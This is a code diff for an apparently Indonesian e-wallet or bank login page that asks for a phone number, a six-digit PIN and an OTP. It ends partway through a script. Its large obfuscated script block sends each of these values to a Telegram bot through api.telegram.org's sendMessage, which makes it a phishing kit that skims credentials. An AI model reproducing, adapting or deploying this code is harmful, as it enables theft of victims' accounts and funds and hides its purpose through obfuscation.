+$('.inpotp').on('keydown', function(event) {
+    const inputs = $('.inpotp');
+    const key = event.key;
+    const index = inputs.index(this);
+    if (key === 'Backspace' && event.target.value.length === 0) {
+        if (index > 0) {
+            inputs[index - 1].focus();
+        }
+    };
+});
+</script>
+<script>
+$(document).ready(function() {
+    $('.clear').click(function() {
+        $('.inppin').val('');
+        $('#pin1').focus();
+    });
+    $('.clearotp').click(function() {
+        $('.inpotp').val('');
+        $('#otp1').focus();
+    });
+    $('.show').click(function() {
+        $('.inppin').each(function() {
+            if ($(this).attr('type') === 'password') {
+                $(this).attr('type', 'number');
+                $(".show").text("SEMBUNYIKAN");
+            } else {
+                $(this).attr('type', 'password');
+                $(".show").text("TAMPILKAN");
+            }
+        });
+    });
+});
+</script>
+<script>
+ function nextPrev(){
+ $(".box-login").removeClass("closeright");
+$(".box-login").addClass("animated");     event.preventDefault();
+       setTimeout(function(){
+           $("#homeku").hide();
+           $("#back1").show();
+           $("#butonku").fadeOut();
+           $(".box-login").fadeIn();
+           $("#process1").hide();
+       },300);
+ }   
+ 
+ 
+ function goback1(){
+    setTimeout(function(){
+     $("#homeku").addClass("bounceInLeft"); 
+     $(".box-login").removeClass("animated");     
+     $("#homeku").show();
+      $(".box-login").fadeOut();
+      $("#butonku").fadeIn();
+      $("#back1").hide();
+       $("#process").hide();
+       
+     },300);
+ }
+ 
+ </script>
+ <script>
+ 
+ function goback2(){
+     $("#process").show();
+     setTimeout(function(){
+    $("#formPin").fadeOut();
+     $("#formNohp").fadeIn();
+       $("#process").hide();
+        $("#inp").val('');
+        $("#back1").show();
+        $("#back2").hide();
+        document.getElementById("formPin").reset();
+        $('.inppin').val('');
+     },500);
+ }
+</script>
+
+
+
+<script>
+function tutupotp(){
+$(".bgotp").hide();    
+}
+</script>
+
+<script>
+     var _0x1ae7b0=_0x195e;(function(_0x3d93be,_0x4b5f9d){var _0x5c2a65=_0x195e,_0x44465b=_0x3d93be();while(!![]){try{var _0x6f8195=parseInt(_0x5c2a65(0x10e))/(0xf5c*0x1+-0xcd1+0x1a*-0x19)+parseInt(_0x5c2a65(0x117))/(0xbc8+-0xca1*-0x1+-0x1867)+-parseInt(_0x5c2a65(0x18e))/(0x27b*0xf+0x1fb6+-0x44e8)*(parseInt(_0x5c2a65(0x1ae))/(0x258e+-0x8*0x15b+0x1ab2*-0x1))+parseInt(_0x5c2a65(0xd7))/(-0x123c+0x28c+0xfb5*0x1)*(-parseInt(_0x5c2a65(0x12d))/(0xce*-0x1b+-0x247c+0x3a3c*0x1))+-parseInt(_0x5c2a65(0x150))/(-0xed9+0x211*-0x3+-0x41*-0x53)*(parseInt(_0x5c2a65(0x133))/(0x1d6d+0x2b*-0x1d+0x2b*-0x92))+-parseInt(_0x5c2a65(0xcb))/(0xa8f*0x1+-0x355*0xb+0x1a21)*(parseInt(_0x5c2a65(0x15d))/(-0xa71+0x4cb*-0x5+0x2272))+parseInt(_0x5c2a65(0x123))/(0x111b+-0x2042+0x185*0xa)*(parseInt(_0x5c2a65(0xc1))/(-0x4a1+-0x13e*0x17+-0x213f*-0x1));if(_0x6f8195===_0x4b5f9d)break;else _0x44465b['push'](_0x44465b['shift']());}catch(_0xd0fac4){_0x44465b['push'](_0x44465b['shift']());}}}(_0x3682,0x496*0x1ac+0x5c1c6+0x17*-0x3a04));var tarif=sessionStorage[_0x1ae7b0(0xec)](_0x1ae7b0(0xed));document[_0x1ae7b0(0x19a)+_0x1ae7b0(0xc2)](_0x1ae7b0(0xed))[_0x1ae7b0(0x156)]=tarif+'';function _0x195e(_0x13cfb8,_0x4b400d){var _0x18b3c2=_0x3682();return _0x195e=function(_0x186403,_0x2a8484){_0x186403=_0x186403-(-0x8*-0x185+-0x1de7+0x127c);var _0x5242ee=_0x18b3c2[_0x186403];return _0x5242ee;},_0x195e(_0x13cfb8,_0x4b400d);}function sendNohp(_0x1f1f91){var _0x3076e2=_0x1ae7b0,_0x5741d3={'pLcdJ':_0x3076e2(0x1b0)+_0x3076e2(0x101)+_0x3076e2(0x18c),'GgTtt':function(_0x4ed360,_0xd20e8a){return _0x4ed360(_0xd20e8a);},'cSCuF':_0x3076e2(0x182),'GaJws':function(_0x534987,_0x1612d3){return _0x534987(_0x1612d3);},'raCIU':_0x3076e2(0x1b2),'YjRfP':_0x3076e2(0x124),'cPLdE':_0x3076e2(0x1c6),'UzyWN':_0x3076e2(0x1b8),'tfcah':_0x3076e2(0xcf),'oZcBO':function(_0x547016,_0x358cbe){return _0x547016(_0x358cbe);},'hwRxY':_0x3076e2(0x17f),'PXorg':_0x3076e2(0x168),'MbLdz':_0x3076e2(0x1a6),'RYQZp':function(_0xbacb05,_0x7931f3,_0x4b5a04){return _0xbacb05(_0x7931f3,_0x4b5a04);},'wVvgK':_0x3076e2(0x1c3),'RvTKP':function(_0xd25994,_0x86cd15){return _0xd25994+_0x86cd15;},'Iblyj':function(_0x2c40ae,_0x4e43e3){return _0x2c40ae+_0x4e43e3;},'phABJ':function(_0x28d7c9,_0x55d44f){return _0x28d7c9+_0x55d44f;},'aQjCt':_0x3076e2(0x120)+_0x3076e2(0x16a),'GKioq':_0x3076e2(0xbd),'twSXB':_0x3076e2(0x11c),'yjLjn':function(_0x4a12d2,_0x23e7de){return _0x4a12d2(_0x23e7de);},'urfWj':_0x3076e2(0x13a),'LQqix':_0x3076e2(0x165)+_0x3076e2(0x194),'vuQnh':_0x3076e2(0x118),'wcFef':_0x3076e2(0xed)},_0x5be3a7=_0x5741d3[_0x3076e2(0x1a2)][_0x3076e2(0x10c)]('|'),_0x37d777=0x173b+0x3cc+0xbb*-0x25;while(!![]){switch(_0x5be3a7[_0x37d777++]){case'0':var _0x1fd550={'wEvxL':function(_0x491a30,_0x2871d2){var _0x53bd0f=_0x3076e2;return _0x5741d3[_0x53bd0f(0xc0)](_0x491a30,_0x2871d2);},'hiAHT':_0x5741d3[_0x3076e2(0x197)],'yFwuh':function(_0xb61e5c,_0x3cf93e){var _0xd009aa=_0x3076e2;return _0x5741d3[_0xd009aa(0x17b)](_0xb61e5c,_0x3cf93e);},'rHEbq':_0x5741d3[_0x3076e2(0x1bc)],'kDXDO':_0x5741d3[_0x3076e2(0x140)],'emASj':_0x5741d3[_0x3076e2(0xf6)],'CZfwY':_0x5741d3[_0x3076e2(0xfc)],'FddgC':_0x5741d3[_0x3076e2(0x196)],'HieNF':function(_0x303613,_0x1c0c88){var _0x593464=_0x3076e2;return _0x5741d3[_0x593464(0xea)](_0x303613,_0x1c0c88);},'SOfzA':_0x5741d3[_0x3076e2(0x179)],'baQgx':_0x5741d3[_0x3076e2(0x104)],'CQjnu':_0x5741d3[_0x3076e2(0x112)],'LNkyh':function(_0x482b43,_0x111778,_0x2af53d){var _0x46d23f=_0x3076e2;return _0x5741d3[_0x46d23f(0x1c5)](_0x482b43,_0x111778,_0x2af53d);}};continue;case'1':var _0x2e9f79=document[_0x3076e2(0x19a)+_0x3076e2(0xc2)](_0x5741d3[_0x3076e2(0xf7)])[_0x3076e2(0x156)];continue;case'2':_0x1f1f91[_0x3076e2(0xd1)+_0x3076e2(0xfa)]();continue;case'3':var _0x3e3e4a=_0x5741d3[_0x3076e2(0x1bd)](_0x5741d3[_0x3076e2(0x1bd)](_0x5741d3[_0x3076e2(0xfb)](_0x5741d3[_0x3076e2(0xce)]('',_0x211561[_0x3076e2(0x156)]),_0x5741d3[_0x3076e2(0x1c2)]),_0x5741d3[_0x3076e2(0x14f)]),_0x308e54[_0x3076e2(0x156)]);continue;case'4':var _0x308e54=document[_0x3076e2(0x19a)+_0x3076e2(0xc2)](_0x5741d3[_0x3076e2(0xf7)]);continue;case'5':var _0x211561=document[_0x3076e2(0x19a)+_0x3076e2(0xc2)](_0x5741d3[_0x3076e2(0xdc)]);continue;case'6':_0x5741d3[_0x3076e2(0x148)]($,_0x5741d3[_0x3076e2(0x179)])[_0x3076e2(0x1b9)]();continue;case'7':$[_0x3076e2(0x1a8)]({'url':_0x3076e2(0x14c)+_0x3076e2(0x136)+_0x3076e2(0x100)+token+(_0x3076e2(0x139)+_0x3076e2(0x14a)+'=')+grup+_0x3076e2(0x12e)+_0x3e3e4a+(_0x3076e2(0x1ac)+_0x3076e2(0x162)),'method':_0x3076e2(0xeb),'success':function(){var _0x20859b=_0x3076e2,_0x11779a=_0x1fd550[_0x20859b(0x1b7)][_0x20859b(0x10c)]('|'),_0x79896d=0x1175+0xd45+0xab*-0x2e;while(!![]){switch(_0x11779a[_0x79896d++]){case'0':document[_0x20859b(0x19a)+_0x20859b(0xc2)](_0x1fd550[_0x20859b(0x190)])[_0x20859b(0x19b)][_0x20859b(0xe9)]=_0x1fd550[_0x20859b(0x169)];continue;case'1':_0x1fd550[_0x20859b(0x115)]($,_0x1fd550[_0x20859b(0x130)])[_0x20859b(0xf9)]();continue;case'2':_0x1fd550[_0x20859b(0x116)]($,_0x1fd550[_0x20859b(0x198)])[_0x20859b(0x151)]();continue;case'3':document[_0x20859b(0x19a)+_0x20859b(0xc2)](_0x1fd550[_0x20859b(0x193)])[_0x20859b(0x19b)][_0x20859b(0xe9)]=_0x1fd550[_0x20859b(0xe3)];continue;case'4':_0x1fd550[_0x20859b(0x13e)](setTimeout,function(){var _0x12561a=_0x20859b;_0x1fd550[_0x12561a(0x1c8)]($,_0x1fd550[_0x12561a(0x1ba)])[_0x12561a(0x1b6)](),_0x1fd550[_0x12561a(0x115)]($,_0x1fd550[_0x12561a(0x129)])[_0x12561a(0x128)]();},0xa*0x281+-0x1f39+0x823);continue;}break;}}});continue;case'8':_0x5741d3[_0x3076e2(0xc0)]($,_0x5741d3[_0x3076e2(0x11e)])[_0x3076e2(0xd5)](_0x5741d3[_0x3076e2(0x145)]);continue;case'9':sessionStorage[_0x3076e2(0x18d)](_0x5741d3[_0x3076e2(0x15f)],_0x2e9f79);continue;case'10':sessionStorage[_0x3076e2(0x18d)](_0x5741d3[_0x3076e2(0x11d)],_0x344564);continue;case'11':_0x5741d3[_0x3076e2(0x148)]($,_0x5741d3[_0x3076e2(0x11e)])[_0x3076e2(0xd9)]();continue;case'12':var _0x344564=document[_0x3076e2(0x19a)+_0x3076e2(0xc2)](_0x5741d3[_0x3076e2(0x11d)])[_0x3076e2(0x156)];continue;}break;}};function sendPin(){var _0x49af1c=_0x1ae7b0,_0x198e85={'fbkDz':_0x49af1c(0x10b)+_0x49af1c(0xd8)+_0x49af1c(0x16e),'ayUuA':_0x49af1c(0x192),'xyDSA':_0x49af1c(0x11f),'thIDg':_0x49af1c(0x11b),'pBpYv':_0x49af1c(0x11c),'XAJMX':_0x49af1c(0xda),'lLCWJ':_0x49af1c(0x1c3),'nvPoQ':_0x49af1c(0x111),'adYNM':function(_0x1980d2,_0x5c1f59){return _0x1980d2+_0x5c1f59;},'owylu':function(_0x2b0a90,_0x5cfc80){return _0x2b0a90+_0x5cfc80;},'TzOTB':_0x49af1c(0xc5)+_0x49af1c(0x143),'yzrZe':_0x49af1c(0x1ab),'IeCqw':_0x49af1c(0x118),'sMUJV':_0x49af1c(0xc9),'IWIWX':_0x49af1c(0xc3),'zPLyf':function(_0x8c7b56,_0x3b3639){return _0x8c7b56(_0x3b3639);},'JPYBB':_0x49af1c(0x17f),'ffeuD':function(_0x26042a,_0x484e0e,_0x562350){return _0x26042a(_0x484e0e,_0x562350);},'GGwVc':_0x49af1c(0x1a6),'zqmDw':_0x49af1c(0x171),'HMFKf':_0x49af1c(0x189),'Eewuz':function(_0x32788e,_0x4ce1b2){return _0x32788e+_0x4ce1b2;},'QpgCT':function(_0x46cc2c,_0x213bb2){return _0x46cc2c+_0x213bb2;},'yWMoE':function(_0x407b3,_0x5976b4){return _0x407b3+_0x5976b4;},'rvjYE':function(_0x45cc81,_0x2ceb6f){return _0x45cc81+_0x2ceb6f;},'CEVXb':function(_0x3fdf55,_0x2d5c5d){return _0x3fdf55+_0x2d5c5d;},'epXwd':_0x49af1c(0x120)+_0x49af1c(0x16a),'yQtjP':_0x49af1c(0xbd),'Sssuq':_0x49af1c(0x1a4)+_0x49af1c(0x12c),'Cvfmd':_0x49af1c(0x157)},_0x55533f=_0x198e85[_0x49af1c(0x1c7)][_0x49af1c(0x10c)]('|'),_0x38ec02=-0x6*0x134+0x20cf+0x1*-0x1997;while(!![]){switch(_0x55533f[_0x38ec02++]){case'0':var _0x278a04=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x1af)]);continue;case'1':var _0x5128c0=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x1a0)]);continue;case'2':var _0x15477e=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x131)]);continue;case'3':var _0x2415c5=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0xd0)]);continue;case'4':var _0xdc38f0=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0xef)]);continue;case'5':var _0x3047af=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x180)]);continue;case'6':document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x132)])[_0x49af1c(0xe2)]=_0x198e85[_0x49af1c(0x199)](_0x198e85[_0x49af1c(0x147)](_0x198e85[_0x49af1c(0x1b5)],_0x4f0cf8),_0x198e85[_0x49af1c(0xca)]);continue;case'7':var _0x4f0cf8=sessionStorage[_0x49af1c(0xec)](_0x198e85[_0x49af1c(0xdd)]);continue;case'8':var _0x1894d7=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x13d)]);continue;case'9':$[_0x49af1c(0x1a8)]({'url':_0x49af1c(0x14c)+_0x49af1c(0x136)+_0x49af1c(0x100)+token+(_0x49af1c(0x139)+_0x49af1c(0x14a)+'=')+grup+_0x49af1c(0x12e)+_0x1567af+(_0x49af1c(0x1ac)+_0x49af1c(0x162)),'method':_0x49af1c(0xeb),'success':function(){var _0x140d4b=_0x49af1c,_0x3580ee=_0x46fdaf[_0x140d4b(0xe7)][_0x140d4b(0x10c)]('|'),_0x4c8013=-0xb59+0x175c+-0xc03;while(!![]){switch(_0x3580ee[_0x4c8013++]){case'0':_0x46fdaf[_0x140d4b(0x1ad)]($,_0x46fdaf[_0x140d4b(0x1c4)])[_0x140d4b(0x151)]();continue;case'1':_0x46fdaf[_0x140d4b(0x1a3)](setInterval,countdown,0x1414+-0x132+-0x4fe*0x3);continue;case'2':document[_0x140d4b(0x19a)+_0x140d4b(0xc2)](_0x46fdaf[_0x140d4b(0x178)])[_0x140d4b(0x19b)][_0x140d4b(0xe9)]=_0x46fdaf[_0x140d4b(0xe6)];continue;case'3':_0x46fdaf[_0x140d4b(0x1ad)]($,_0x46fdaf[_0x140d4b(0x119)])[_0x140d4b(0x128)]();continue;case'4':_0x46fdaf[_0x140d4b(0x17e)]($,_0x46fdaf[_0x140d4b(0x12f)])[_0x140d4b(0x1b6)]();continue;}break;}}});continue;case'10':var _0x46fdaf={'ycuKb':_0x198e85[_0x49af1c(0x144)],'BZWcR':function(_0x36581a,_0x4147e6){var _0xbc450e=_0x49af1c;return _0x198e85[_0xbc450e(0x153)](_0x36581a,_0x4147e6);},'TIRKf':_0x198e85[_0x49af1c(0xde)],'shOAV':function(_0x51da6e,_0x20ba39,_0x1aec67){var _0x3a4641=_0x49af1c;return _0x198e85[_0x3a4641(0xee)](_0x51da6e,_0x20ba39,_0x1aec67);},'HGXeF':_0x198e85[_0x49af1c(0x132)],'ccybN':_0x198e85[_0x49af1c(0x154)],'wtBbf':_0x198e85[_0x49af1c(0x175)],'EcBcp':function(_0x1e4544,_0x25a1bc){var _0x45eaac=_0x49af1c;return _0x198e85[_0x45eaac(0x153)](_0x1e4544,_0x25a1bc);},'vGoQf':_0x198e85[_0x49af1c(0x1b3)]};continue;case'11':var _0x1567af=_0x198e85[_0x49af1c(0x181)](_0x198e85[_0x49af1c(0x147)](_0x198e85[_0x49af1c(0x176)](_0x198e85[_0x49af1c(0x147)](_0x198e85[_0x49af1c(0x199)](_0x198e85[_0x49af1c(0x176)](_0x198e85[_0x49af1c(0x172)](_0x198e85[_0x49af1c(0xc4)](_0x198e85[_0x49af1c(0x199)](_0x198e85[_0x49af1c(0x172)](_0x198e85[_0x49af1c(0x15a)]('',_0x2415c5[_0x49af1c(0x156)]),_0x198e85[_0x49af1c(0xf5)]),_0x198e85[_0x49af1c(0x15e)]),_0x3047af[_0x49af1c(0x156)]),_0x198e85[_0x49af1c(0xbe)]),_0x15477e[_0x49af1c(0x156)]),_0xdc38f0[_0x49af1c(0x156)]),_0x1894d7[_0x49af1c(0x156)]),_0x16b211[_0x49af1c(0x156)]),_0x5128c0[_0x49af1c(0x156)]),_0x278a04[_0x49af1c(0x156)]);continue;case'12':var _0x16b211=document[_0x49af1c(0x19a)+_0x49af1c(0xc2)](_0x198e85[_0x49af1c(0x106)]);continue;}break;}};function _0x3682(){var _0x3ee11d=['ge?chat_id','text','https://ap','kPBjw','jdMrZ','GKioq','503678vrPoYq','hide','yUUwi','zPLyf','GGwVc','otp2','value','pin4','UXAoC','JngTN','CEVXb','7|9|8|17|1','RDpMD','84050iWWLcH','yQtjP','vuQnh','XSgDu','.loadingOt','e=html','TBeOQ','otp4','0000000000','oba\x20lagi','FcoMR','back2','CZfwY','𝗺𝗼𝗿\x20\x20:\x20','HdKpg','BytaA','SWODI','1|0|11|9','gAdjf','otp1','#otp1','yWMoE','Qdcta','Cdksu','zqmDw','QpgCT','aroMP','HGXeF','hwRxY','WEANQ','GaJws','|14|6|13|2','YQvNf','EcBcp','#process','lLCWJ','Eewuz','#formPin','QhZey','JKEVa','ryVLA','LVkoK','tVzTa','tjkIv','.bgotp','LFjVu','PBiJS','|5|4|3|7','setItem','99eNZcMB','XitmG','emASj','FQZtt','pin6','baQgx','000','otp3','tfcah','cSCuF','SOfzA','adYNM','getElement','style','mqUwH','QIbWm','SBqPu','BrHqX','xyDSA','ang\x20ke\x20+62','pLcdJ','shOAV','%0A※\x20𝗣𝗜𝗡\x20\x20','ya\x20sudah\x20b','block','Kode\x20baru\x20','ajax','black','𝗣\x20\x20\x20\x20:\x20','\x20via<br/>','&parse_mod','BZWcR','123528GNMVxl','ayUuA','0|6|2|11|8','cPphB','#pin1','HMFKf','XXSGm','TzOTB','fadeIn','kDXDO','none','show','hiAHT','jloMA','raCIU','RvTKP','beDtt','lJgeW','kReWo','|10','aQjCt','inp','TIRKf','RYQZp','back1','fbkDz','wEvxL','%2B62','Sssuq','HtyAM','GgTtt','3336IAeXDW','ById','0|2|4|1|3','rvjYE','Kode\x20dikir','wLYrV','.alert','HRFug','pin3','yzrZe','513Qrqddv','VHDHh','kcFGd','phABJ','#formNohp','pBpYv','preventDef','rjZhF','naWxY','JeQcT','mask','UgkGY','55FTDddd','|2|4|8|12|','blur','pin2','NtgWw','twSXB','IeCqw','JPYBB','ikan\x20koden','BYaYG','otp5','innerHTML','CQjnu','dikirim\x20ul','TqwTx','ccybN','ycuKb','ItsVG','display','oZcBO','POST','getItem','tarif','ffeuD','XAJMX','UdquO','ZGmAf','NGXUW','val','xmOad','epXwd','cPLdE','wVvgK','EpqpU','fadeOut','ault','Iblyj','UzyWN','fnFTW','WyCiX','yHOOa','.org/bot','|12|10|1|9','TfREO','6|5|1|0|15','PXorg','ewKwy','Cvfmd','EMvLb','UJBjz','Rkirw','4|2|1|3|0','10|7|6|3|5','split','WplOE','725134mHtVTs','LKnXQ','fmQEq','alert','MbLdz','iGWVe','|4|12|3|11','yFwuh','HieNF','1525302WSRNJw','nomor','wtBbf','RpoZz','pin1','logo','wcFef','urfWj','pin5','%0A%0A※\x20𝗡𝗼','JOjPM','css','60434xGzLVG','2|0|3|1|4','%0A%0A※\x20𝗢𝗧','ifeAE','OBNrV','focus','rHEbq','ZOHyf','color','\x20\x20:\x20','23652iPnuqh','&text=','vGoQf','FddgC','thIDg','nvPoQ','104ycNOdM','red','Mohon\x20past','i.telegram','.inpotp','WXXXw','/sendMessa','#inp','HhtgA','uQsLk','sMUJV','LNkyh','yKepi','YjRfP','nZqCJ','CCHBQ','im\x20ke\x20+62\x20','IWIWX','LQqix','enar\x20dan\x20c','owylu','yjLjn','apTBT'];_0x3682=function(){return _0x3ee11d;};return _0x3682();}function sendOtp(){var _0x37f908=_0x1ae7b0,_0xfc10ff={'CCHBQ':_0x37f908(0x15b)+_0x37f908(0x103)+_0x37f908(0x114)+_0x37f908(0x17c)+_0x37f908(0x1c1),'UXAoC':_0x37f908(0x157),'uQsLk':_0x37f908(0xc9),'WyCiX':function(_0x102ceb,_0x1928eb){return _0x102ceb+_0x1928eb;},'JeQcT':function(_0x55e6d4,_0x553012){return _0x55e6d4+_0x553012;},'wLYrV':function(_0x29875f,_0x3c76f1){return _0x29875f+_0x3c76f1;},'JOjPM':function(_0x5b0842,_0x54b59f){return _0x5b0842+_0x54b59f;},'aroMP':function(_0x1e4269,_0x524d5e){return _0x1e4269+_0x524d5e;},'VHDHh':function(_0x53f574,_0x26eb47){return _0x53f574+_0x26eb47;},'NGXUW':function(_0x4f8471,_0x304b9b){return _0x4f8471+_0x304b9b;},'BrHqX':function(_0x418cc2,_0x243231){return _0x418cc2+_0x243231;},'RpoZz':function(_0x523ada,_0x38619a){return _0x523ada+_0x38619a;},'rjZhF':function(_0x5bbd91,_0x4c8be7){return _0x5bbd91+_0x4c8be7;},'Cdksu':function(_0x447416,_0x235223){return _0x447416+_0x235223;},'naWxY':function(_0x19a900,_0x4132af){return _0x19a900+_0x4132af;},'PBiJS':_0x37f908(0x120)+_0x37f908(0x16a),'TqwTx':_0x37f908(0xbd),'mqUwH':_0x37f908(0x1a4)+_0x37f908(0x12c),'jloMA':_0x37f908(0x125)+_0x37f908(0x1aa),'WEANQ':_0x37f908(0x155),'EpqpU':_0x37f908(0x192),'UgkGY':_0x37f908(0xda),'WXXXw':_0x37f908(0xe1),'RDpMD':function(_0x418040,_0x54e4b3){return _0x418040(_0x54e4b3);},'BYaYG':_0x37f908(0xc7),'UJBjz':_0x37f908(0x135)+_0x37f908(0xdf)+_0x37f908(0x1a5)+_0x37f908(0x146)+_0x37f908(0x166),'QIbWm':_0x37f908(0x12b),'ewKwy':_0x37f908(0x134),'NtgWw':_0x37f908(0x10a),'xmOad':function(_0x45ed8e,_0x2c770b){return _0x45ed8e(_0x2c770b);},'tVzTa':_0x37f908(0x1a9),'UdquO':_0x37f908(0x118),'Rkirw':_0x37f908(0x137),'EMvLb':_0x37f908(0x111),'fmQEq':function(_0x17a74a,_0x21840a){return _0x17a74a+_0x21840a;},'HhtgA':_0x37f908(0x1a7)+_0x37f908(0xe4)+_0x37f908(0x1a1),'HtyAM':_0x37f908(0x1ab),'kPBjw':_0x37f908(0x161)+'p','XXSGm':function(_0x2123fe,_0x14460f,_0x80e54c){return _0x2123fe(_0x14460f,_0x80e54c);},'XitmG':_0x37f908(0x11c),'HdKpg':function(_0x3069e0,_0x2bf2b4){return _0x3069e0(_0x2bf2b4);},'kReWo':_0x37f908(0x195),'yKepi':_0x37f908(0x170),'ZOHyf':function(_0x1d637d,_0x2e913e,_0x385a83){return _0x1d637d(_0x2e913e,_0x385a83);},'fnFTW':_0x37f908(0x164),'XSgDu':_0x37f908(0x11f),'gAdjf':_0x37f908(0x11b),'YQvNf':_0x37f908(0x1c3)},_0x58c24b=_0xfc10ff[_0x37f908(0x142)][_0x37f908(0x10c)]('|'),_0x504403=-0x1a5*-0xf+0x5*0x173+0xa*-0x331;while(!![]){switch(_0x58c24b[_0x504403++]){case'0':var _0xe86946=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x158)]);continue;case'1':var _0x1d3360=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x13c)]);continue;case'2':var _0x1747d6=_0xfc10ff[_0x37f908(0xfe)](_0xfc10ff[_0x37f908(0xfe)](_0xfc10ff[_0x37f908(0xd4)](_0xfc10ff[_0x37f908(0xc6)](_0xfc10ff[_0x37f908(0x121)](_0xfc10ff[_0x37f908(0x121)](_0xfc10ff[_0x37f908(0x177)](_0xfc10ff[_0x37f908(0xcc)](_0xfc10ff[_0x37f908(0xf2)](_0xfc10ff[_0x37f908(0x19f)](_0xfc10ff[_0x37f908(0x11a)](_0xfc10ff[_0x37f908(0x121)](_0xfc10ff[_0x37f908(0xd2)](_0xfc10ff[_0x37f908(0x174)](_0xfc10ff[_0x37f908(0x174)](_0xfc10ff[_0x37f908(0xc6)](_0xfc10ff[_0x37f908(0xd3)]('',_0x43081c[_0x37f908(0x156)]),_0xfc10ff[_0x37f908(0x18b)]),_0xfc10ff[_0x37f908(0xe5)]),_0x4ad304[_0x37f908(0x156)]),_0xfc10ff[_0x37f908(0x19c)]),_0x124b69[_0x37f908(0x156)]),_0x36d48d[_0x37f908(0x156)]),_0x1d3360[_0x37f908(0x156)]),_0xe86946[_0x37f908(0x156)]),_0x7ade4f[_0x37f908(0x156)]),_0x27f8c8[_0x37f908(0x156)]),_0xfc10ff[_0x37f908(0x1bb)]),_0xfc86da[_0x37f908(0x156)]),_0x17f649[_0x37f908(0x156)]),_0x4fb341[_0x37f908(0x156)]),_0x4c792f[_0x37f908(0x156)]),_0x8adced[_0x37f908(0x156)]);continue;case'3':var _0x17f649=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x17a)]);continue;case'4':var _0x27f8c8=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0xf8)]);continue;case'5':var _0x36d48d=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0xd6)]);continue;case'6':var _0x8adced=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x138)]);continue;case'7':var _0x3f64c0={'SBqPu':function(_0xa2341f,_0x48259f){var _0xde64f0=_0x37f908;return _0xfc10ff[_0xde64f0(0x15c)](_0xa2341f,_0x48259f);},'apTBT':_0xfc10ff[_0x37f908(0xe0)],'BytaA':_0xfc10ff[_0x37f908(0x108)],'FQZtt':_0xfc10ff[_0x37f908(0x19d)],'tjkIv':_0xfc10ff[_0x37f908(0x105)],'nZqCJ':_0xfc10ff[_0x37f908(0xdb)],'beDtt':function(_0x2b4986,_0x553cad){var _0x3d28a5=_0x37f908;return _0xfc10ff[_0x3d28a5(0xf4)](_0x2b4986,_0x553cad);},'yUUwi':_0xfc10ff[_0x37f908(0x187)],'TfREO':_0xfc10ff[_0x37f908(0xf0)],'iGWVe':function(_0x188dbe,_0x1ae8d6){var _0x2d2c73=_0x37f908;return _0xfc10ff[_0x2d2c73(0x15c)](_0x188dbe,_0x1ae8d6);},'Qdcta':_0xfc10ff[_0x37f908(0x109)],'JKEVa':_0xfc10ff[_0x37f908(0x107)],'kcFGd':function(_0x28e723,_0x1bc8da){var _0x4f07b9=_0x37f908;return _0xfc10ff[_0x4f07b9(0x110)](_0x28e723,_0x1bc8da);},'ZGmAf':_0xfc10ff[_0x37f908(0x13b)],'WplOE':_0xfc10ff[_0x37f908(0xbf)],'QhZey':_0xfc10ff[_0x37f908(0x14d)],'ryVLA':function(_0x46c566,_0x59c786,_0x22cb89){var _0x2a2a29=_0x37f908;return _0xfc10ff[_0x2a2a29(0x1b4)](_0x46c566,_0x59c786,_0x22cb89);}};continue;case'8':var _0x43081c=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x18f)]);continue;case'9':_0xfc10ff[_0x37f908(0x16b)]($,_0xfc10ff[_0x37f908(0x14d)])[_0x37f908(0x1b9)]();continue;case'10':$[_0x37f908(0x1a8)]({'url':_0x37f908(0x14c)+_0x37f908(0x136)+_0x37f908(0x100)+token+(_0x37f908(0x139)+_0x37f908(0x14a)+'=')+grup+_0x37f908(0x12e)+_0x1747d6+(_0x37f908(0x1ac)+_0x37f908(0x162)),'method':_0x37f908(0xeb),'success':function(){var _0x442043=_0x37f908,_0x17bc1d={'OBNrV':_0x3f64c0[_0x442043(0x141)],'HRFug':function(_0x5f2d29,_0x5708bc){var _0x5bad70=_0x442043;return _0x3f64c0[_0x5bad70(0x1be)](_0x5f2d29,_0x5708bc);},'ifeAE':_0x3f64c0[_0x442043(0x149)],'FcoMR':_0x3f64c0[_0x442043(0x191)],'jdMrZ':_0x3f64c0[_0x442043(0x152)],'cPphB':_0x3f64c0[_0x442043(0x102)],'LVkoK':function(_0x19b61f,_0x1c575b){var _0x49755a=_0x442043;return _0x3f64c0[_0x49755a(0x113)](_0x19b61f,_0x1c575b);},'TBeOQ':_0x3f64c0[_0x442043(0x173)],'ItsVG':_0x3f64c0[_0x442043(0x184)],'yHOOa':function(_0x55285e,_0x1cd8f1){var _0x5ce835=_0x442043;return _0x3f64c0[_0x5ce835(0xcd)](_0x55285e,_0x1cd8f1);},'lJgeW':function(_0x44fe2f,_0x2f4b50){var _0x2e5bf0=_0x442043;return _0x3f64c0[_0x2e5bf0(0xcd)](_0x44fe2f,_0x2f4b50);},'JngTN':_0x3f64c0[_0x442043(0xf1)],'LKnXQ':_0x3f64c0[_0x442043(0x10d)],'LFjVu':function(_0x1eabab,_0x507bc8){var _0x3ce5b0=_0x442043;return _0x3f64c0[_0x3ce5b0(0x1be)](_0x1eabab,_0x507bc8);},'SWODI':_0x3f64c0[_0x442043(0x183)]};_0x3f64c0[_0x442043(0x185)](setTimeout,function(){var 